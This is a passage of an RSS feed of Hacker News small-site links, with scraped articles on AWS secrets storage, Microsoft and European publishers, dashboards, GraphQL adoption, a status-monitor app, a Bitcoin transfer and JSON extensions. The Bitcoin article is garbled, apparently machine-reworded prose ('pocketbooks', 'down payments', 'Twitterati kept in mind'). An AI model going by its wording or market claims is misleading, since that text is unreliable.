<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/humanitarian-aid-or-isis-fundraising/">https://restofworld.org/2021/humanitarian-aid-or-isis-fundraising/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/humanitarian-aid-or-isis-fundraising/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224980</guid>
            <pubDate>Mon, 22 Feb 2021 14:36:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Parameter Store vs. Secrets Manager]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26224915">thread link</a>) | @skwashd
<br/>
February 22, 2021 | https://www.davehall.com.au/blog/2021/02/22/parameter-store-vs-secrets-manager/ | <a href="https://web.archive.org/web/*/https://www.davehall.com.au/blog/2021/02/22/parameter-store-vs-secrets-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section><div><div><p>The handling of secrets in AWS is up there with tabs vs spaces and vim vs emacs
in terms of technical debates. In one corner we have Amazon’s original secrets
store <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html">System Manager Parameter
Store</a>.
In the other is the new(er) challenger, <a href="https://aws.amazon.com/secrets-manager/">Secrets
Manager</a>. Let’s see how they compare.</p><p>We won’t be looking at HashiCorp’s Vault in this comparison, because the focus
of this post is to compare AWS’ managed service. This is one of those occasions
where it is cheaper to accept some vendor lock in and avoid the hassle of
managing a cluster of Consul nodes.</p><p>This comparison won’t cover every little detail. We will stick to the key
differences between the two tools with the aim of helping you choose the best
one for your use case.</p><h2 id="round-1-key-value-store">Round 1: Key Value Store</h2><p>At the heart of both services is a managed key value store. You send your
sensitive data to Amazon and they store it until you need it. Each value is
referenced via a unique key that you define.</p><p>Both services allow you to name your secrets using simple strings. Parameter
store allows keys to be any mix of <code>a-zA-Z0-9_.-</code> up to 966 characters, while
secrets manager’s limit is 512 unicode characters.</p><p>Parameter store allows you to store your secrets in a hierarchy. By using a path
structure you build up the structure. So instead of simple names such as
<code>DB_URI</code> you can use something more complex like <code>/myapp/DB_URI</code>. The Parameter
Store API allows you to fetch all the values in the hierarchy with a single
call. This is really handy when you have multiple values stored for an
application.</p><p><strong>Winner:</strong> Parameter Store for supporting hierarchical structures.</p><h2 id="round-2-storage-limitations">Round 2: Storage Limitations</h2><p>Both services allow users to store any unicode string. Standard SSM Parameters
are limited to 4Kb, while their advanced siblings can be up to 8Kb. Secrets
manager allows values up to 64Kb. Depends on your data storage needs these
limits may impact choice of service.</p><p>Both services retain 100 revisions of your secret. That can be handy if someone
accidentally overwrites the wrong value.</p><p><strong>Winner:</strong> Secrets Manager for higher value limits</p><h2 id="round-3-encryption">Round 3: Encryption</h2><p>Both parameter store and secrets manager store your secrets in an encrypted
state using KMS encryption keys. This ensures your sensitive credentials are
kept secure.</p><p>Unlike secrets manager, parameter store allows to decide if you want your values
to be stored unencrypted. While this isn’t advisable for secrets it can useful
for non sensitive information. If you hit a modified time stamp, check sum or
other non sensitive value option, this can be useful. It reduces the number of
KMS API calls and leads to faster response times. This makes it easier to use
parameter store as your single solution for application configuration
management.</p><p><strong>Winner:</strong> Parameter Store for the extra flexibility</p><h2 id="round-4-rotation">Round 4: Rotation</h2><p>Rotating credentials can be a tedious task that can result in downtime. Amazon
promotes the credentials rotation feature in Secrets Manager. This is mostly
marketing hype. The feature is limited to databases and it is really just an
easy way to deploy a Lambda function that does the rotation. There are similar
Lambdas available to do this with Parameter Store.</p><p><strong>Winner:</strong> Draw, we won’t reward over hyping features</p><h2 id="round-5-cost">Round 5: Cost</h2><p>Parameter Store has two flavours of parameters, standard and advanced. Standard
parameters don’t incur any monthly storage fees. Adding to the complexity there
are two price tiers for interacting with the Parameter Store API, standard and
high throughput. As you have already guessed you pay for the <a href="https://docs.aws.amazon.com/general/latest/gr/ssm.html">higher
quotas</a>. While standard
is free, the high rate will cost you 0.05USD per 10000 interactions. The higher
throughput is an <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/parameter-store-throughput.html">account wide
setting</a>.</p><p>For advanced parameters you pay 0.05USD per parameter per month. You decide when
creating a parameter if it will be an advanced. You pay 0.05USD per 10000 API
interactions with advanced parameters. The one consolation is that you won’t pay
extra for enabling high throughput when fetching advanced parameters.</p><p>With Secrets Manager you pay for everything. You will pay 0.40USD per secret per
month, then 0.05USD per 10000 API interactions. The <a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/reference_limits.html">Secrets Manager API
quotas</a>
are the highest of the 3 options.</p><p>On top of these costs, you will <a href="https://aws.amazon.com/kms/pricing/">pay 0.03USD for 10000 KMS API
requests</a>. Even if you fetch multiple
parameters in a single API call, you will pay to decrypt each one individually.</p><p><strong>Winner:</strong> Parameter Store standard cos you can’t beat free.</p><h2 id="the-verdict">The Verdict</h2><p>There is no knock out winner in this contest. It is going to come down to a
points decision. Our judges have awarded the win to Parameter Store.</p><p>While Secrets Manager can be a better fit for some use cases, often it is
overkill. Unless you require the larger storage limits or very high throughput
you’re wasting money on secrets manager.</p><p>If you can work within the constraints of the standard tier of Parameter Store
it is a very cost effective tool for managing your secrets and other application
configuration.</p><p>Our earlier blog post on <a href="https://www.davehall.com.au/blog/2018/08/26/aws-parameter-store/">AWS System Manager Parameter
Store</a> is a great introduction for new
users.</p></div></div></section></article></div>]]>
            </description>
            <link>https://www.davehall.com.au/blog/2021/02/22/parameter-store-vs-secrets-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224915</guid>
            <pubDate>Mon, 22 Feb 2021 14:29:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft joins forces with European news publishers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224860">thread link</a>) | @samizdis
<br/>
February 22, 2021 | https://www.techregister.co.uk/microsoft-joins-forces-with-european-news-publishers/ | <a href="https://web.archive.org/web/*/https://www.techregister.co.uk/microsoft-joins-forces-with-european-news-publishers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Microsoft has joined forces with Europe’s publishers to deepen the troubles of Google and Facebook, launching a project to develop an Australian-style arbitration system for the EU that would force Big Tech to pay for news.</p>
<p>The move by the Seattle-based company is one of its most brazen yet to align with the press industry, exploit the difficulties of its Silicon Valley rivals and promote its own search engine Bing as a copyright-friendly alternative for news. </p>
<p>The project announced on Monday will involve Microsoft working with Europe’s four leading lobby groups for news publishers to develop a legal solution to “mandate payments” for the use of content by “gatekeepers that have dominant market power”. </p>
<p>The informal coalition, which will propose that the plan is added to upcoming EU legislation on Big Tech, includes the European Publishers Council, News Media Europe, and the associations for European magazine and newspaper publishers, which together represent thousands of news outlets.</p>
<p>Microsoft and the publishers said on Monday that they will support a form of arbitration, and will look closely at the model developed in Australia, which has prompted Google to strike a flurry of licensing deals and Facebook to stop sharing Australian news on its service.</p>
<p>Christian Van Thillo, a Belgian media executive who is chair of the European Publishers Council, welcomed “Microsoft’s recognition” of the value “our content brings to the core business of search engines and social networks”.</p>
<p>“It is crucial that our regulators recognise this key point, and don’t get misled into thinking that side deals on the basis of a standalone product are the same thing,” he said, adding: “All publishers should get an agreement — no one should be left out.”</p>
<p>Microsoft has offered vocal public support for the Australian reforms and has urged other governments to follow suit, much to the chagrin of its rivals. </p>
<p>Unveiling the project with European publishers, Casper Klynge, a vice-president of Microsoft, said access to quality news was “critical to the success of our democracies”. </p>
<p>The Australian system has caught the eye of regulators around the world, who are also looking for ways to empower publishers in licensing negotiations with Google and Facebook. </p>
<p>Canada is preparing Australia-style laws, and the EU and UK are looking at importing elements of the system into upcoming laws. It remains unclear whether the calculations of lawmakers have been changed by Facebook’s decision to boycott news in Australia.</p>
<p>EU governments are in the process of implementing a recent overhaul of copyright law, which strengthened the claim of publishers to seek compensation for the use of news snippets by Google. </p>
<p>But industry executives and some MEPs are concerned that the provisions, which do not include any arbitration system to resolve disputes, are too easy for Big Tech groups to sidestep. Google recently reached a licensing deal with French publishers, but paid much smaller sums than the settlements agreed with Australian publishers.</p>
<p>Fernando de Yarza, president of News Media Europe, said: “The experiences in France and Australia have shown us that there’s a real need for a binding instrument.”</p>
<p>The Financial Times has reached commercial agreements for news with both Google and Facebook. The FT is not a member of any of the associations involved in the Microsoft initiative.</p>
<p>Google and Facebook both strongly criticise the Australian reforms as unworkable and unfair. Neither company had commented on Microsoft’s initiative in Europe by the time of publication. </p>
</div></div>]]>
            </description>
            <link>https://www.techregister.co.uk/microsoft-joins-forces-with-european-news-publishers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224860</guid>
            <pubDate>Mon, 22 Feb 2021 14:24:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Do We Talk About When We Talk About Dashboards? (2018)]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 11 (<a href="https://news.ycombinator.com/item?id=26224846">thread link</a>) | @sebg
<br/>
February 22, 2021 | https://alper.datav.is/publications/dashboards/ | <a href="https://web.archive.org/web/*/https://alper.datav.is/publications/dashboards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>Dashboards have long been the much maligned visualization vehicle of choice for decision-making in commercial and governmental situations.  While the visualization research community has concentrated much of its effort on visual analytics, the commercial success and widespread use of dashboards begs more attention.  Critically, dashboards are becoming many peoples’ direct connection to “big data” sources, enabling data democratization and wider access to data.</p>

<p>In this paper, we explore the genre of dashboards through a two-prong approach.  We survey the existing literature in business, marketing, and related fields to capture the relevant factors to consider when designing appropriate dashboards and their tools for consumption by different parties, all of which have differing levels of visualization literacy, data literacy, and decision agency.  We also collect examples of dashboard designs based on the dimensions derived from our literature search, and identify different clusters of dashboard designs with similar analysis goals, audiences, and decision support.</p>

<p>We call ourselves the “dashboard conspiracy:” a truly diverse collection of authors across Tableau Research, Microsoft Research, and Simon Fraiser University.</p>

<p><em>This work was presented at <a href="http://ieeevis.org/year/2018/welcome">IEEE VIS 2018</a> in Berlin, Germany.</em></p>

<p><em>This work was discussed in an half-hour datastori.es podcast, <a href="https://datastori.es/135-the-dashboard-conspiracy-with-lyn-bartram-and-alper-sarikaya/">give it a listen</a>!</em></p>

    </div></div>]]>
            </description>
            <link>https://alper.datav.is/publications/dashboards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224846</guid>
            <pubDate>Mon, 22 Feb 2021 14:22:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The State of GraphQL 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224536">thread link</a>) | @lukzar
<br/>
February 22, 2021 | https://blog.graphqleditor.com/state-of-graphql-2020 | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/state-of-graphql-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The State of JavaScript is an annual survey that collects data from JS professionals from across the globe. This year’s edition questioned  23,765 developers in 137 countries about development areas such as:</p>
<ul>
<li>Front-end frameworks,</li>
<li>Back-end framework</li>
<li>JavaScript flavors,</li>
<li>Testing libraries,</li>
<li>Build tools,</li>
<li><em>Data layer</em>.</li>
</ul>
<p>Let’s take a look at GraphQL data concluded in the Data layer part of the survey.</p>
<h2>Data layer report</h2>
<p>The data layer part covers technologies used to transmit and manage data. The users were asked about their awareness, interest, usage experience, and satisfaction with various data layer libraries (including GraphQ) and here are the results.</p>
<h4>The awareness and interest</h4>
<p>Since becoming publicly available in 2015 GraphQL has received a lot of coverage on the Internet, both positive and negative. The awareness of GraphQL is constantly growing (from 97% to 98% comparing to the previous year) while the interest graph shows a little decline (from 90% to 87%), which seems to be pretty natural for maturing technology.</p>
<h4>The usage of GraphQL</h4>
<p>The growth of GraphQL usage among survey responders was the biggest between 2018 and 2019 and it amounted to 40% (from 22%) so it’s unrealistic to expect the same pace of growth. <strong>In 2020 the usage of GraphQL has gained 6%</strong> which seems to be a fine result, especially when thinking about GraphQL as a somehow mature technology.</p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/52ab5/usage.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Usage" title="Usage" src="https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/fcda8/usage.png" srcset="https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/12f09/usage.png 148w,
https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/e4a3f/usage.png 295w,
https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/fcda8/usage.png 590w,
https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/efc66/usage.png 885w,
https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/c83ae/usage.png 1180w,
https://blog.graphqleditor.com/static/65f03c030e0fc5e58d888ed7b0b11c4f/52ab5/usage.png 1420w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h4>The satisfaction of GraphQL</h4>
<p>The satisfaction of GraphQL remains and nearly the same level.
The advantages and flaws of GraphQL are factually described in various articles, blog posts and talks so users deciding to give GraphQL know what they are signing for. GraphQL has a great community standing behind it, working hard every day to provide solutions, tools and different ways to overcome all its shortcomings. </p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/6b95e/satisfaction.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Satisfaction" title="Satisfaction" src="https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/fcda8/satisfaction.png" srcset="https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/12f09/satisfaction.png 148w,
https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/e4a3f/satisfaction.png 295w,
https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/fcda8/satisfaction.png 590w,
https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/efc66/satisfaction.png 885w,
https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/c83ae/satisfaction.png 1180w,
https://blog.graphqleditor.com/static/b5abe7c825191f7594e8e03b16eff45e/6b95e/satisfaction.png 1458w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h4>The GraphQL Experience</h4>
<p>The general experience observed in past years shows a positive tone. The number of people that never heard, are not interested or wound not use GraphQL has decreased significantly and the latest results show that 88.1% of respondents are either interested in GraphQL or declares that they have already worked with and would do it again.</p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/82b28/graphql.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="GraphQL Experience over time" title="GraphQL Experience over time" src="https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/fcda8/graphql.png" srcset="https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/12f09/graphql.png 148w,
https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/e4a3f/graphql.png 295w,
https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/fcda8/graphql.png 590w,
https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/efc66/graphql.png 885w,
https://blog.graphqleditor.com/static/37fa2eaba70849065382025ad56c825e/82b28/graphql.png 931w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>The below chart presents the Positive vs Negative responses split and the GraphQL results come out very positive. The GraphQL wins significantly in the data layer category.</p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/c0566/posneg.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Positive vs Negative split" title="Positive vs Negative split" src="https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/fcda8/posneg.png" srcset="https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/12f09/posneg.png 148w,
https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/e4a3f/posneg.png 295w,
https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/fcda8/posneg.png 590w,
https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/efc66/posneg.png 885w,
https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/c83ae/posneg.png 1180w,
https://blog.graphqleditor.com/static/d4d4513fcd0d7090b77163136ac7ab3e/c0566/posneg.png 1544w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h2>The summary</h2>
<p>The data layer space is still in constant movement which makes selecting the right technology for your needs a bit tricky. The survey administrators decided to prepare a data graph that could possibly really help you decide if the technology you are looking into is going in the right direction and ease the process of the decision if you should start seriously thinking about adopting it.</p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/8733b/change-ot.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="GraphQL over last years graph" title="GraphQL over last years graph" src="https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/fcda8/change-ot.png" srcset="https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/12f09/change-ot.png 148w,
https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/e4a3f/change-ot.png 295w,
https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/fcda8/change-ot.png 590w,
https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/efc66/change-ot.png 885w,
https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/c83ae/change-ot.png 1180w,
https://blog.graphqleditor.com/static/50c2e320890d44205359412979481f03/8733b/change-ot.png 1495w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>Each of the lines represents different technology and is filled by the data from 2016 to 2020. The higher position on the Y-axis means that the technology has been used by more people, and a point further to the right on the X-axis means more users have used it and would use it again or are interested in learning more about it.</p>
<p>Over a couple of last years, GraphQL has ranked up from technology worth keeping an eye on (with low usage, but high satisfaction) to a date later characterizing in high usage and satisfaction which makes it a safe technology to adopt. The general conclusion is that GraphQL and all the technologies, libraries, tools its fuelling are here to stay. </p>
<hr>
<p><em>All graphs and data comes from the StateofJs.com, if you are interested in more details regarding data layer or other JS aspects make sure to visit <a href="https://2020.stateofjs.com/en-US/technologies/datalayer/">2020.stateofjs.com</a></em></p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>
            </description>
            <link>https://blog.graphqleditor.com/state-of-graphql-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224536</guid>
            <pubDate>Mon, 22 Feb 2021 13:57:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Monitor the services you use, from your menu bar]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224534">thread link</a>) | @alollou
<br/>
February 22, 2021 | https://instatus.com/out | <a href="https://web.archive.org/web/*/https://instatus.com/out">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><a href="https://instatus.com/out/download/mac"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M376 160H272v153.37l52.69-52.68a16 16 0 0122.62 22.62l-80 80a16 16 0 01-22.62 0l-80-80a16 16 0 0122.62-22.62L240 313.37V160H136a56.06 56.06 0 00-56 56v208a56.06 56.06 0 0056 56h240a56.06 56.06 0 0056-56V216a56.06 56.06 0 00-56-56zM272 48a16 16 0 00-32 0v112h32z"></path></svg>Get on mac OS</a><a href="https://instatus.com/out/video" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M464 384.39a32 32 0 01-13-2.77 15.77 15.77 0 01-2.71-1.54l-82.71-58.22A32 32 0 01352 295.7v-79.4a32 32 0 0113.58-26.16l82.71-58.22a15.77 15.77 0 012.71-1.54 32 32 0 0145 29.24v192.76a32 32 0 01-32 32zM268 400H84a68.07 68.07 0 01-68-68V180a68.07 68.07 0 0168-68h184.48A67.6 67.6 0 01336 179.52V332a68.07 68.07 0 01-68 68z"></path></svg>Watch intro video</a><div><p>Select services you depend on</p><p>Check their status in your menu bar</p><p>Get notified when they change their status</p></div></div></div>]]>
            </description>
            <link>https://instatus.com/out</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224534</guid>
            <pubDate>Mon, 22 Feb 2021 13:57:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calls for Bitcoin Plunge Emerge over Mysterious $1.5 Bn BTC Transfer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224353">thread link</a>) | @nwotnagrom
<br/>
February 22, 2021 | https://www.bitcoinprofit.app/news/calls-for-bitcoin-plunge-emerge-over-mysterious-1-5-bn-btc-transfer/ | <a href="https://web.archive.org/web/*/https://www.bitcoinprofit.app/news/calls-for-bitcoin-plunge-emerge-over-mysterious-1-5-bn-btc-transfer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p> A high-volumed transfer to a Bitcoin exchange purse made on February 21 has actually increased calls for a wider rate improvement amongst risk-averse investors.</p><p>An entity (or a team of entities) attributed regarding 28,000 BTC worth over $1.5 billion to an address that apparently comes from OKEx’s over the counter solutions. A Twitterati kept in mind that the OTC address better attributed BTC right into numerous pocketbooks, among which apparently comes from a “rich” address that has actually revealed organizations with several cloud mining rip-offs as well as cash laundering tasks in Asia.</p><div id="attachment_146788"><p><img aria-describedby="caption-attachment-146788" loading="lazy" src="https://www.bitcoinprofit.app/wp-content/uploads/2021/02/Calls-for-Bitcoin-Plunge-Emerge-Over-Mysterious-15bn-BTC-Transfer.jpeg" alt="Bitcoin, cryptocurrency, BTCUSD, BTCUSDT" width="909" height="660"></p><p id="caption-attachment-146788">The highlighted address apparently comes from a bitcoin scammer. Source: <a href="https://twitter.com/thisisbullish/status/1363622946112237573/photo/1" target="_blank" rel="noopener follow" data-wpel-link="exclude">This Is Bullish</a></p></div><p>Analysts regard bigger crypto transfers to exchanges as well as their linked solutions as an indication of impending marketing stress. An investor probably down payments bitcoins to public pocketbooks when s/he plans to market them for cash money or exchange them for various other cryptocurrency symbols.</p><p>Conversely, bigger withdrawals indicate their objective of not selling/exchanging yet holding the bitcoins.</p><h2>Bitcoin Liquidity</h2><p>Of late, information on exchanges revealed substantial decrease in exchanges’ BTC books, coming by around 635,000 from its March 2020 top, simply timid of 3 million. They mostly accompanied a remarkable increase in the BTC/ USD currency exchange rate, which increased by around 1,200 percent in the exact same duration.</p><div id="attachment_146789"><p><img aria-describedby="caption-attachment-146789" loading="lazy" src="https://www.bitcoinprofit.app/wp-content/uploads/2021/02/Calls-for-Bitcoin-Plunge-Emerge-Over-Mysterious-15bn-BTC-Transfer.png" alt="Bitcoin, cryptocurrency, BTCUSD, BTCUSDT" width="893" height="660"></p><p id="caption-attachment-146789">Bitcoin books on all exchanges dove greatly given that March 2020. Source: <a href="https://cryptoquant.com/overview/btc-exchange-flows" target="_blank" rel="noopener nofollow external" data-wpel-link="external">CryptoQuant</a></p></div><p>The OKEx down payment, as stated over, at the same time, showed up when Bitcoin was revealing indications of peaking. On Sunday, the cryptocurrency attained a brand-new rate turning point over $58,000, leaving the Twitterati worried regarding an unavoidable sell-off in advance.</p><blockquote><p><span>“The ‘OKEx Whale’ is ‘LOUD’ in the way they conduct business, they don’t care about </span><span>#hodl</span><span> or </span><span>#lazereyes,” the pseudonymous blockchain private investigator clarified.</span><span> “[It is] happy to market dump on you. This coin flow tells us they now have ammo to increase sell-pressure in the future.”</span></p></blockquote><h2> A Short- term Shock?</h2><p>There are likewise opportunities that the marketplace winds up soaking up the marketing stress as Bitcoin becomes conventional capitalists’ principles as a safe-haven property.</p><p>Ben Lilly, a cryptocurrency financial expert, <a href="https://jarvislabs.substack.com/p/bitcoins-current-crisis" target="_blank" rel="noopener nofollow external" data-wpel-link="external">penned a paper</a> that concentrated on a recurring liquidity dilemma in the Bitcoin market. He mentioned that 3 fields: crypto-enabled investment company, corporations/institutions, as well as decentralized money, have actually been proactively drawing Bitcoin’s supply out of the exchanges.</p><blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">Corporations/Institutions<a href="https://twitter.com/michael_saylor?ref_src=twsrc%5Etfw" data-wpel-link="exclude" target="_blank" rel="follow noopener">@michael_saylor</a> at MicroStrategy: 71k BTC throughout this period.<a href="https://twitter.com/elonmusk?ref_src=twsrc%5Etfw" data-wpel-link="exclude" target="_blank" rel="follow noopener">@elonmusk</a> at Tesla: Let’s state regarding 42k BTC utilizing an avg rate of $35k/BTC</p><p>Square, Bitwise, Stone Ridge Holdings, Ruffer (of course offered back some, yet still appropriate): 72k</p><p> 185k BTC to this team</p><p>— Ben Lilly (@MrBenLilly) <a href="https://twitter.com/MrBenLilly/status/1362079633160683520?ref_src=twsrc%5Etfw" data-wpel-link="exclude" target="_blank" rel="follow noopener">February 17, 2021</a></p></blockquote><blockquote><p>“It means bitcoin is in fact becoming scarce. If this continues, a liquidity crisis will transpire pushing prices considerably higher.”</p></blockquote><p>Technically, Bitcoin anticipates to prolong its temporary benefit predisposition because of an affordable loved one toughness indication analysis as well as distinct assistance degrees in its 20- as well as 50-4H relocating standards.</p></div></div>]]>
            </description>
            <link>https://www.bitcoinprofit.app/news/calls-for-bitcoin-plunge-emerge-over-mysterious-1-5-bn-btc-transfer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224353</guid>
            <pubDate>Mon, 22 Feb 2021 13:40:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JSON with Commas and Comments]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 155 (<a href="https://news.ycombinator.com/item?id=26224255">thread link</a>) | @todsacerdoti
<br/>
February 22, 2021 | https://nigeltao.github.io/blog/2021/json-with-commas-comments.html | <a href="https://web.archive.org/web/*/https://nigeltao.github.io/blog/2021/json-with-commas-comments.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      

      

<p><em>Summary: JWCC is a minimal extension to the widely used JSON file format with
(1) optional commas after the final element of arrays and objects and (2) C/C++
style comments. These two features make it more suitable for human-editable
configuration files, without adding so many features that it’s incompatible
with numerous other (deliberate and accidental) existing JSON extensions.</em></p>

<h2 id="extensibility">Extensibility</h2>

<p>The Peter Principle is the half-joking, half-serious observation that people
get promoted to their level of incompetence, because being competent at level
<code>N</code> leads to being promoted to level <code>N+1</code>.</p>

<p>My colleague Simon Morris made a similar observation about software complexity:</p>

<blockquote>
  <p>Software has a Peter Principle. If a piece of code is comprehensible, someone
will extend it, so they can apply it to their own problem. If it’s
incomprehensible, they’ll write their own code instead. Code tends to be
extended to its level of incomprehensibility.</p>
</blockquote>

<h3 id="the-many-json-extensions">The Many JSON Extensions</h3>

<p>There’s a similar story with file formats. If they’re comprehensible, they’ll
get extended. JSON (JavaScript Object Notation) is this article’s example. The
<a href="https://json.org/">original specification</a> fits on a single page, either as
text or diagrams. The file format is simple and ubiquitous. Therefore, there
are many extensions - supersets of JSON. Here’s just a few (including two
slightly different extensions both called “JSONC”):</p>

<ul>
  <li><a href="https://json5.org/">JSON5</a></li>
  <li><a href="https://komkom.github.io/">JSONC</a> #1</li>
  <li><a href="https://code.visualstudio.com/docs/languages/json#_json-with-comments">JSONC</a> #2</li>
  <li><a href="https://hjson.github.io/">HJSON</a></li>
  <li><a href="https://github.com/lightbend/config/blob/master/HOCON.md">HOCON</a></li>
</ul>

<p>Suprisingly, <a href="https://yaml.org/">YAML</a> is also a superset of JSON. Not just
conceptually, but also in the sense that valid JSON files are also valid YAML
files (although there’s some divergence about whether duplicate keys are
legitimate). As a bonus, if you use YAML, then to paraphrase <a href="http://regex.info/blog/2006-09-15/247">Jamie
Zawinski</a>: now you have <a href="https://noyaml.com/">NO
problems</a>.</p>

<h3 id="wandering-off-the-specification">Wandering Off the Specification</h3>

<p>There are also informal supersets-of-JSON in widespread use, sometimes more by
accident than by design. The Chromium web browser’s <a href="https://source.chromium.org/chromium/chromium/src/+/master:base/json/json_reader.h;l=27;drc=d0919138b7951c1a154cf802a68aad7904b6f4c9">JSON parser goes
off-spec</a>
in a number of ways. The timeline could have been:</p>

<ol>
  <li>Some developer long ago (perhaps in a yak-shaving hurry) wrote or
copy/pasted some parsing code that was accidentally too lenient, allowing a
superset-of-JSON. Perhaps they re-used existing code that handled C-style
string escapes, like the <code>"\n"</code> in <code>"line\nbreak"</code>, without realizing that
it also unescaped <code>"\v"</code>, valid in a C string but not a JSON string.</li>
  <li>People use the software. They write first-party and third-party JSON for it.
Some of it is actually malformed (e.g. they have <code>"\v"</code> inside strings) but
tests (manual and automatic) usually check that new features work, not that
all the slightly-incorrect things are rejected. Nobody notices at the time.</li>
  <li>Years pass. <a href="https://www.hyrumslaw.com/">Hyrum’s Law</a> slowly kicks in. We
can no longer tighten this custom JSON parser implementation to follow the
spec more strictly because too many things (in unknown places) will break.</li>
</ol>

<p>This also affects our ability to replace one JSON library with another. For
example, we might want to switch from a C++-based JSON parser to a Rust-based
one, because of its security benefits. If the upstream Rust library chooses to
follow the spec diligently (which is a perfectly reasonable position) then it
